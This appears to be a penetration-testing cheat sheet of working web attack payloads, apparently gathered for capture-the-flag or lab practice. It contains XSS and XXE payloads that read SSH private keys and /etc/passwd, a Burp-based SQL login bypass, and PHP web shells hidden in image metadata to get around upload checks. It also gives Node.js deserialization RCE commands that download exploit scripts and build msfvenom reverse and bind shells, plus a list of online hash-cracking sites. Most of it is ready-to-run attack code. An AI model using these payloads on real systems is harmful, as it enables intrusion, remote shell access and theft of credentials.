" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

#Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>hack  &book;</thp>


#Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack
%26book%3B</thp>

```
### Sql-login Bypass

>Open Burp-suite
Make and intercept a request
Send to intruder
Cluster attack.
Paste in sqlibypass-list
    https://bobloblaw.gitbooks.io/security/content/sql-injections.html
Attack
Check for response length variation

### Bypass img Upload

```bash
Change extension: .pHp3 or pHp3.jpg
Modify mimetype: Content-type: image/jpeg
Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
Add gif header: GIF89a;
All at the same time.
# inject PHP into img

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' shell.jpeg

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg

```

### Node.js
Node.js encodes JSON with base64 for the "profile" cookie.
This can be decoded with burpsuite or other means.

Note about the nodejsshell.py script:
> Dont run nodejsshell.py generated payload on production boxes. It may crash the Node.JS server.
> 
```bash
# RCE for note.js by modifying the profile cookie
wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py

python nodejsshell.py <LHOST> <LPORT> |  grep eval |  sed 's/.*/{"rce":"_$$ND_FUNC$$_function (){(&)}()"}/' | base64 -w0; echo \n

# put the above output as the payload of 'profile=', start a listener and submit the request.

# Another script, by nullarmor, can also be used for this task:
wget https://raw.githubusercontent.com/nullarmor/hackthebox-exploits/master/celestial/celestial.py

python3 celestial.py --rhost $IP --lhost <LHOST> --lport <LPORT>

```

```bash
# Using MSFVenom to generate a node.js reverse shell payload:
for p in $(msfvenom -p nodejs/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> -f raw 2>/dev/null | grep -o .|sed 's/.*/x&x/');
do if [ "$p" == "x" ]; then echo -n "32,"; 
else printf "%d," "'${p:1:1}" ; 
fi; 
done | sed 's/.*/{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(&32))}()"}/' | base64 -w0

# Using MSFVenom to generate a bindshell payload
for p in $(msfvenom -p nodejs/shell_bind_tcp lport=<PORT> -f raw 2>/dev/null | grep -o .|sed 's/.*/x&x/');
do if [ "$p" == "x" ]; then echo -n "32,"; 
else printf "%d," "'${p:1:1}" ; 
fi; done | sed 's/.*/{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(&32))}()"}/' | base64 -w0


```
References:
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
* https://medium.com/egghunter/temple-of-doom-1-vulnhub-walkthrough-ec011b5e70ce
* https://github.com/nullarmor/hackthebox-exploits/tree/master/celestial


### Online crackers

https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
